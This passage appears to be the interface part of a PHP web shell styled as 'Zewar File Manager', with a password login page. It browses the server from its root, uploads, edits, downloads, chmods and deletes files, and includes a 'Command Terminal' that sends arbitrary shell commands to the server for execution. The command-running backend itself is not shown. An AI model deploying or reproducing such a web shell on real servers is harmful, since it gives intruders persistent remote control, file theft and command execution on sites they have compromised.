        <a href="?d=<?php echo base64_encode($document_root); ?>" class="btn btn-root"><i class="fas fa-globe"></i> Document Root</a>
    </div>
    
    <div class="breadcrumb">
        <i class="fas fa-folder-open"></i> 
        <?php 
        $breadcrumb_path = '';
        $total_parts = count($path_parts);
        $index = 0;
        foreach ($path_parts as $part):
            if ($part === '/') {
                $breadcrumb_path = '/';
                echo '<a href="?d=' . base64_encode('/') . '"><i class="fas fa-home"></i> Root</a>';
            } else {
                $breadcrumb_path .= ($index > 0 ? '/' : '') . $part;
                $encoded = base64_encode($breadcrumb_path);
                echo '<a href="?d=' . $encoded . '">' . htmlspecialchars($part) . '</a>';
            }
            if ($index < $total_parts - 1) {
                echo '<span class="separator"><i class="fas fa-chevron-right"></i></span>';
            } else {
                if ($part !== '/') {
                    echo '<span class="separator"> → </span><span class="current-path">' . htmlspecialchars($part) . '</span>';
                }
            }
            $index++;
        endforeach;
        ?>
    </div>
    
    <div class="file-table">
        <table>
            <thead>
                <tr>
                    <th><i class="fas fa-file"></i> Name</th>
                    <th><i class="fas fa-database"></i> Size</th>
                    <th><i class="fas fa-lock"></i> Permissions</th>
                    <th><i class="fas fa-calendar"></i> Modified</th>
                    <th><i class="fas fa-cogs"></i> Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php if (empty($items)): ?>
                <tr><td colspan="5" style="text-align: center; padding: 40px;"><i class="fas fa-folder-open"></i> Directory is empty</td></tr>
                <?php else: ?>
                <?php foreach ($items as $item): ?>
                <?php 
                    $text_class = $item['writable'] ? 'item-name-writable' : 'item-name-readonly';
                    $link_class = $item['writable'] ? 'item-link-writable' : 'item-link-readonly';
                    $badge_class = $item['writable'] ? 'badge-writable' : 'badge-readonly';
                    $writable_status = $item['writable'] ? '<i class="fas fa-check-circle"></i> Writable' : '<i class="fas fa-ban"></i> Read Only';
                ?>
                <tr>
                    <td class="item-name">
                        <span class="item-icon"><?php echo $item['icon']; ?></span>
                        <?php if ($item['is_dir']): ?>
                            <a href="<?php echo $item['link']; ?>" class="<?php echo $link_class; ?>">
                                <?php echo htmlspecialchars($item['name']); ?> <i class="fas fa-chevron-right" style="font-size:10px;"></i>
                            </a>
                        <?php else: ?>
                            <span class="<?php echo $text_class; ?>">
                                <?php echo htmlspecialchars($item['name']); ?>
                            </span>
                        <?php endif; ?>
                        <small style="font-size:0.6rem; margin-left:8px; color:#888;"><?php echo $writable_status; ?></small>
                    </td>
                    <td><?php echo $item['size']; ?></td>
                    <td><span class="badge <?php echo $badge_class; ?>"><?php echo $item['perms']; ?></span></td>
                    <td><?php echo $item['mtime']; ?></td>
                    <td class="action-group">
                        <?php if (!$item['is_dir']): ?>
                            <button class="action-btn" onclick="editFile('<?php echo base64_encode($item['name']); ?>')" title="Edit"><i class="fas fa-edit"></i> Edit</button>
                            <button class="action-btn" onclick="downloadFile('<?php echo base64_encode($current . '/' . $item['name']); ?>', '<?php echo htmlspecialchars($item['name']); ?>')" title="Download"><i class="fas fa-download"></i> Download</button>
                        <?php endif; ?>
                        <button class="action-btn" onclick="renameItem('<?php echo htmlspecialchars($item['name']); ?>')" title="Rename"><i class="fas fa-pencil-alt"></i> Rename</button>
                        <button class="action-btn" onclick="chmodItem('<?php echo htmlspecialchars($item['name']); ?>', '<?php echo $item['perms']; ?>')" title="Chmod"><i class="fas fa-lock"></i> Chmod</button>
                        <button class="action-btn" onclick="deleteItem('<?php echo htmlspecialchars($item['name']); ?>')" title="Delete" style="background:#dc3545;"><i class="fas fa-trash"></i> Delete</button>
                    </td>
                </tr>
                <?php endforeach; ?>
                <?php endif; ?>
            </tbody>
        </table>
    </div>
</div>

<!-- Floating CMD Modal -->
<div class="cmd-overlay" id="cmdOverlay" onclick="closeCmdModal()"></div>
<div class="cmd-modal" id="cmdModal">
    <div class="cmd-header">
        <h3><i class="fas fa-terminal"></i> Command Terminal</h3>
        <button class="cmd-close" onclick="closeCmdModal()">&times;</button>
    </div>
    <div class="cmd-body">
        <div class="cmd-input-group">
            <i class="fas fa-dollar-sign" style="color:#4caf50; font-size:1.2rem;"></i>
            <input type="text" id="cmd_command" placeholder="Enter command (ls, pwd, whoami, etc.)" onkeypress="if(event.key==='Enter') executeCommandFloating()" autofocus>
            <button class="btn btn-primary" onclick="executeCommandFloating()"><i class="fas fa-play"></i> Run</button>
        </div>
        <div id="cmd_output_floating" class="cmd-output">
            <i class="fas fa-info-circle"></i> Welcome to Terminal!<br>
            Type your command and press Enter or click Run.<br>
            <span style="color:#ffd700;">Example:</span> ls, pwd, whoami, php -v
        </div>
    </div>
    <div class="cmd-footer">
        <button class="btn btn-outline" onclick="clearCmdOutput()"><i class="fas fa-eraser"></i> Clear</button>
        <button class="btn btn-danger" onclick="closeCmdModal()"><i class="fas fa-times"></i> Close</button>
    </div>
</div>

<!-- Modal Upload -->
<div id="uploadModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h3><i class="fas fa-upload"></i> Upload File</h3>
            <button class="modal-close" onclick="closeModal('uploadModal')">&times;</button>
        </div>
        <form method="post" enctype="multipart/form-data">
            <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
            <div class="modal-body">
                <label><i class="fas fa-file"></i> Select File:
                    <input type="file" name="file" required>
                </label>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-outline" onclick="closeModal('uploadModal')">Cancel</button>
                <button type="submit" class="btn btn-primary">Upload</button>
            </div>
        </form>
    </div>
</div>

<!-- Modal Create Folder -->
<div id="folderModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h3><i class="fas fa-folder-plus"></i> Create New Folder</h3>
            <button class="modal-close" onclick="closeModal('folderModal')">&times;</button>
        </div>
        <form method="post">
            <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
            <div class="modal-body">
                <label><i class="fas fa-folder"></i> Folder Name:
                    <input type="text" name="folder_name" placeholder="my_new_folder" required>
                </label>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-outline" onclick="closeModal('folderModal')">Cancel</button>
                <button type="submit" name="create_folder" class="btn btn-primary">Create</button>
            </div>
        </form>
    </div>
</div>

<!-- Modal Create File -->
<div id="fileModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h3><i class="fas fa-file-plus"></i> Create New File</h3>
            <button class="modal-close" onclick="closeModal('fileModal')">&times;</button>
        </div>
        <form method="post">
            <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
            <div class="modal-body">
                <label><i class="fas fa-file"></i> File Name:
                    <input type="text" name="file_name" placeholder="index.php" required>
                </label>
                <label><i class="fas fa-code"></i> File Content (optional):
                    <textarea name="file_content" placeholder="Write your content here..."></textarea>
                </label>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-outline" onclick="closeModal('fileModal')">Cancel</button>
                <button type="submit" name="create_file" class="btn btn-primary">Create</button>
            </div>
        </form>
    </div>
</div>

<!-- Modal Rename -->
<div id="renameModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h3><i class="fas fa-pencil-alt"></i> Rename Item</h3>
            <button class="modal-close" onclick="closeModal('renameModal')">&times;</button>
        </div>
        <form method="post">
            <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
            <input type="hidden" name="old_name" id="rename_old">
            <div class="modal-body">
                <label><i class="fas fa-file"></i> Current Name:
                    <input type="text" id="rename_current" disabled style="opacity:0.7">
                </label>
                <label><i class="fas fa-pen"></i> New Name:
                    <input type="text" name="new_name" id="rename_new" required>
                </label>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-outline" onclick="closeModal('renameModal')">Cancel</button>
                <button type="submit" name="rename" class="btn btn-primary">Rename</button>
            </div>
        </form>
    </div>
</div>

<!-- Modal Chmod -->
<div id="chmodModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h3><i class="fas fa-lock"></i> Change Permissions</h3>
            <button class="modal-close" onclick="closeModal('chmodModal')">&times;</button>
        </div>
        <form method="post">
            <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
            <input type="hidden" name="item" id="chmod_item">
            <div class="modal-body">
                <label><i class="fas fa-file"></i> File/Folder:
                    <input type="text" id="chmod_filename" disabled style="opacity:0.7">
                </label>
                <label><i class="fas fa-key"></i> Permissions (Octal):
                    <input type="text" name="permission" id="chmod_perm" placeholder="0755" maxlength="4" required>
                </label>
                <div style="font-size:0.7rem; color:#aaa; margin-top:10px;">
                    <strong><i class="fas fa-info-circle"></i> Common permissions:</strong><br>
                    0644 = Owner: read/write, Group: read, Others: read (files)<br>
                    0755 = Owner: read/write/execute, Group: read/execute, Others: read/execute (folders)<br>
                    0777 = Full access (not recommended)
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-outline" onclick="closeModal('chmodModal')">Cancel</button>
                <button type="submit" name="chmod" class="btn btn-primary">Apply</button>
            </div>
        </form>
    </div>
</div>

<!-- Modal Delete Confirm -->
<div id="deleteModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h3><i class="fas fa-exclamation-triangle"></i> Confirm Delete</h3>
            <button class="modal-close" onclick="closeModal('deleteModal')">&times;</button>
        </div>
        <form method="post">
            <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
            <input type="hidden" name="item" id="delete_item">
            <div class="modal-body">
                <p><i class="fas fa-trash"></i> Are you sure you want to delete <strong id="delete_name"></strong>?</p>
                <p style="color:#dc3545; font-size:0.8rem; margin-top:10px;"><i class="fas fa-warning"></i> This action cannot be undone!</p>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-outline" onclick="closeModal('deleteModal')">Cancel</button>
                <button type="submit" name="delete" class="btn btn-danger">Delete Permanently</button>
            </div>
        </form>
    </div>
</div>

<script>
function showToast(message, type) {
    let toast = document.createElement('div');
    toast.className = 'toast ' + type;
    toast.innerHTML = '<i class="fas ' + (type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle') + '"></i> ' + message;
    document.body.appendChild(toast);
    setTimeout(function() { toast.remove(); }, 3000);
}

function showModal(id) {
    document.getElementById(id).classList.add('active');
}

function closeModal(id) {
    document.getElementById(id).classList.remove('active');
}

function openCmdModal() {
    document.getElementById('cmdOverlay').classList.add('active');
    document.getElementById('cmdModal').classList.add('active');
    document.getElementById('cmd_command').focus();
}

function closeCmdModal() {
    document.getElementById('cmdOverlay').classList.remove('active');
    document.getElementById('cmdModal').classList.remove('active');
}

function clearCmdOutput() {
    document.getElementById('cmd_output_floating').innerHTML = '<i class="fas fa-info-circle"></i> Terminal cleared!<br>Type your command and press Enter.';
}

function executeCommandFloating() {
    const cmdInput = document.getElementById('cmd_command');
    const cmdOutput = document.getElementById('cmd_output_floating');
    const command = cmdInput.value.trim();
    
    if (!command) {
        showToast('Please enter a command', 'error');
        return;
    }
    
    cmdOutput.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Executing command...';
    
    fetch(`?ajax_cmd=1&t=${Date.now()}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `csrf_token=<?php echo csrf_token(); ?>&command=${encodeURIComponent(command)}`
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            cmdOutput.innerHTML = `<i class="fas fa-dollar-sign" style="color:#4caf50;"></i> <span style="color:#ffd700;">$ ${escapeHtml(command)}</span>\n\n${escapeHtml(data.output || '✓ Command executed successfully')}`;
            cmdInput.value = '';
            showToast('Command executed', 'success');
        } else {
            cmdOutput.innerHTML = `<i class="fas fa-exclamation-triangle" style="color:#dc3545;"></i> Error:\n\n${escapeHtml(data.output)}`;
            showToast('Command failed', 'error');
        }
    })
    .catch(error => {
        cmdOutput.innerHTML = `<i class="fas fa-bug" style="color:#dc3545;"></i> Request failed:\n\n${error.message}`;
        showToast('Request failed', 'error');
    });
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function editFile(encodedName) {
    window.location.href = '?edit=' + encodedName + '&d=<?php echo base64_encode($current); ?>';
}

function downloadFile(encodedPath, filename) {
    window.location.href = '?download=' + encodedPath + '&filename=' + encodeURIComponent(filename);
}

function renameItem(name) {
    document.getElementById('rename_old').value = name;
    document.getElementById('rename_current').value = name;
    document.getElementById('rename_new').value = name;
    showModal('renameModal');
}

function chmodItem(name, currentPerm) {
    document.getElementById('chmod_item').value = name;
    document.getElementById('chmod_filename').value = name;
    document.getElementById('chmod_perm').value = currentPerm;
    showModal('chmodModal');
}

function deleteItem(name) {
    document.getElementById('delete_item').value = name;
    document.getElementById('delete_name').innerText = name;
    showModal('deleteModal');
}

// Close modal on outside click
document.querySelectorAll('.modal').forEach(function(modal) {
    modal.addEventListener('click', function(e) {
        if (e.target === this) {
            this.classList.remove('active');
        }
    });
});

// Close CMD modal with ESC key
document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
        closeCmdModal();
        document.querySelectorAll('.modal.active').forEach(function(modal) {
            modal.classList.remove('active');
        });
    }
});

<?php if ($message): ?>
document.addEventListener('DOMContentLoaded', function() {
    showToast('<?php echo addslashes($message); ?>', '<?php echo $toast_type; ?>');
});
<?php endif; ?>
</script>
</body>
</html>
<?php
// Login page function
function get_login_page($error = '') {
    $csrf = csrf_token();
    return '<!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Zewar File Manager - Login</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif;
                background: linear-gradient(135deg, #0a0a0a 0%, #1a0a2e 100%);
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
            }
            .login-container {
                background: #1a1a2e;
                border-radius: 10px;
                border: 1px solid #ffd700;
                padding: 40px;
                width: 100%;
                max-width: 400px;
                animation: fadeIn 0.5s ease;
            }
            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(-20px); }
                to { opacity: 1; transform: translateY(0); }
            }
            .logo { text-align: center; margin-bottom: 30px; }
            .logo h1 { font-size: 2rem; color: #ffd700; }
            .logo p { color: #aaa; font-size: 0.8rem; margin-top: 5px; }
            .input-group { margin-bottom: 20px; }
            .input-group label { display: block; color: #ffd700; margin-bottom: 8px; font-size: 0.85rem; }
            .input-group input {
                width: 100%;
                padding: 12px 15px;
                background: #0a0a0a;
                border: 1px solid #ffd700;
                border-radius: 5px;
                color: #fff;
                font-size: 1rem;
                transition: all 0.3s;
            }
            .input-group input:focus { outline: none; border-color: #ffed4a; box-shadow: 0 0 10px rgba(255,215,0,0.3); }
            .btn-login {
                width: 100%;
                padding: 12px;
                background: #ffd700;
                border: none;
                border-radius: 5px;
                color: #000;
                font-weight: 600;
                font-size: 1rem;
                cursor: pointer;
                transition: all 0.3s;
            }
            .btn-login:hover { background: #ffed4a; transform: translateY(-2px); }
            .error {
                background: rgba(220,53,69,0.2);
                border-left: 4px solid #dc3545;
                padding: 12px;
                border-radius: 5px;
                margin-bottom: 20px;
                color: #ff6b6b;
                font-size: 0.85rem;
            }
            .footer { text-align: center; margin-top: 20px; color: #666; font-size: 0.7rem; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="logo">
                <i class="fas fa-folder-open" style="font-size: 3rem; color: #ffd700;"></i>
                <h1>Zewar File Manager</h1>
                <p>Secure Access Required</p>
            </div>
            ' . ($error ? '<div class="error"><i class="fas fa-exclamation-triangle"></i> ' . htmlspecialchars($error) . '</div>' : '') . '
            <form method="post">
                <input type="hidden" name="csrf_token" value="' . $csrf . '">
                <div class="input-group">
                    <label><i class="fas fa-lock"></i> Password</label>
                    <input type="password" name="password" placeholder="Enter password" autofocus required>
                </div>
                <button type="submit" class="btn-login"><i class="fas fa-sign-in-alt"></i> Login</button>
            </form>
            <div class="footer"><i class="fas fa-shield-alt"></i> Secure Connection</div>
        </div>
    </body>
    </html>';
}
?>
